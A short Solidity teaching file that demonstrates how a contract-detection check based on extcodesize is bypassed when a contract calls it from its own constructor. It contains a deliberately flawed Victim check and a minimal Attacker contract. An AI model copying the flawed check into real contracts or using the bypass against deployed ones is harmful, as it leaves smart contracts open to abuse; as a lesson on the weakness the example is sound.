pragma solidity >= 0.7.0 < 0.9.0;


//How does a contract find if another address is a contract

contract Victim{
    function isAtContract() public view returns(bool){
        uint32 size;
        address a = msg.sender;
        
        // if there bytes of code grater than zero then it is a contract
        //assembly accesses EVM Ethereum Virtual Machine at low level
        assembly{
            size := extcodesize(a) //retrives the size of the code
        }
        return (size > 0);
    }
}

//if you call address from the constructor there are no byte codes
contract Attacker{
    bool public trickedYou;
    Victim victim;
    
    constructor(address _v) public {
        victim = Victim(_v);
        trickedYou = !victim.isAtContract();
    }
}
